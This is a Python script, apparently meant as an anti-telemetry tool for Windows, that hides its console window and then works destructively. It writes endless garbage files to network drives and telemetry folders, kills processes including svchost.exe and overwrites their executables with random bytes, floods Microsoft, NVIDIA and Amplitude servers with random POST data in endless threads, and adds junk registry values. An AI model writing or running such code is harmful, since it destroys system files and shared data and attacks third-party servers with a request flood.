import ctypes
import sys
import os
import psutil
import random
import threading
import time
import requests
import shutil

# Hide console window
if not sys.executable.endswith("pythonw.exe"):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to fill remote drives with garbage
def fill_remote_drive_with_garbage(file_size_mb=100):
    incoming_connections = psutil.net_connections(kind='tcp')
    if incoming_connections:
        print("Incoming connections detected. Filling remote drives with garbage data...")
        for drive in psutil.disk_partitions():
            if drive.mountpoint.startswith('\\\\'):
                print(f"Filling drive: {drive.mountpoint}")
                counter = 1
                while True:
                    file_path = os.path.join(drive.mountpoint, f"garbage_{counter}.dat")
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(os.urandom(file_size_mb * 1024 * 1024))
                        print(f"Created garbage file: {file_path}")
                        counter += 1
                    except Exception as e:
                        print(f"Drive is full or an error occurred: {e}")
                        break
    else:
        print("No incoming connections detected.")

# Function to corrupt telemetry data aggressively
def corrupt_telemetry_data():
    print("Starting aggressive telemetry corruption...")

    # Known telemetry-related directories (Windows, NVIDIA, etc.)
    telemetry_dirs = [
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis"),
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Telemetry"),
        os.path.join(os.environ.get("ProgramData", ""), "NVIDIA Corporation", "NvTelemetry"),
        os.path.join(os.environ.get("AppData", ""), "Local", "Microsoft", "Windows", "Telemetry"),
        os.path.join(os.environ.get("SystemRoot", ""), "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "Telemetry"),
    ]

    # Known telemetry processes
    telemetry_processes = [
        "TelemetryClient.exe",
        "CompatTelRunner.exe",
        "DeviceCensus.exe",
        "NvTelemetryContainer.exe",
        "svchost.exe",  # Often used for telemetry, though broad
        "wmic.exe",     # Sometimes used for telemetry collection
    ]

    # Known telemetry endpoints
    telemetry_endpoints = [
        "https://telemetry.microsoft.com",
        "https://vortex.data.microsoft.com",
        "https://settings-win.data.microsoft.com",
        "https://watson.telemetry.microsoft.com",
        "https://telemetry.nvidia.com",
        "https://data.amplitude.com",  # Third-party telemetry
    ]

    # Step 1: Fill telemetry directories with garbage files
    for directory in telemetry_dirs:
        if os.path.exists(directory):
            print(f"Corrupting telemetry directory: {directory}")
            counter = 1
            while True:
                garbage_file = os.path.join(directory, f"telemetry_garbage_{counter}.dat")
                try:
                    with open(garbage_file, 'wb') as f:
                        f.write(os.urandom(10 * 1024 * 1024))  # 10 MB of random data
                    print(f"Created garbage file: {garbage_file}")
                    counter += 1
                except Exception as e:
                    print(f"Error writing to {directory}: {e}")
                    break
        else:
            print(f"Telemetry directory not found: {directory}")

    # Step 2: Terminate telemetry processes and replace with garbage executables
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc_name = proc.info['name'].lower()
            if any(tel.lower() in proc_name for tel in telemetry_processes):
                print(f"Terminating telemetry process: {proc_name} (PID: {proc.info['pid']})")
                proc.terminate()
                exe_path = proc.exe()
                if os.path.exists(exe_path):
                    # Overwrite the executable with garbage
                    with open(exe_path, 'wb') as f:
                        f.write(os.urandom(5 * 1024 * 1024))  # 5 MB of garbage
                    print(f"Overwrote telemetry executable: {exe_path}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            print(f"Error handling process {proc.info['name']}: {e}")

    # Step 3: Flood telemetry endpoints with garbage data
    def flood_endpoint(endpoint):
        while True:
            try:
                garbage_data = os.urandom(1024 * 1024)  # 1 MB of random data
                requests.post(endpoint, data=garbage_data, timeout=1)
                print(f"Flooded {endpoint} with 1 MB of garbage data")
            except Exception as e:
                print(f"Error flooding {endpoint}: {e}")
                time.sleep(1)  # Brief pause to avoid overwhelming local resources

    # Start flooding threads for each telemetry endpoint
    for endpoint in telemetry_endpoints:
        threading.Thread(target=flood_endpoint, args=(endpoint,), daemon=True).start()

    # Step 4: Corrupt registry telemetry keys (simulated aggressive overwrite)
    try:
        import winreg
        telemetry_reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack",
            r"SOFTWARE\NVIDIA Corporation\NvTelemetry",
        ]
        for reg_path in telemetry_reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
                for i in range(100):  # Create 100 garbage entries
                    winreg.SetValueEx(key, f"GarbageKey_{i}", 0, winreg.REG_SZ, os.urandom(16).hex())
                print(f"Corrupted registry telemetry key: {reg_path}")
                winreg.CloseKey(key)
            except FileNotFoundError:
                print(f"Registry key not found: {reg_path}")
            except PermissionError:
                print(f"Permission denied for registry key: {reg_path}")
            except Exception as e:
                print(f"Error corrupting registry: {e}")
    except ImportError:
        print("winreg module not available, skipping registry corruption")

# Main function
def main():
    # Start filling remote drives with garbage in a separate thread
    threading.Thread(target=fill_remote_drive_with_garbage, daemon=True).start()

    # Start corrupting telemetry data
    corrupt_telemetry_data()

    # Keep the script running
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()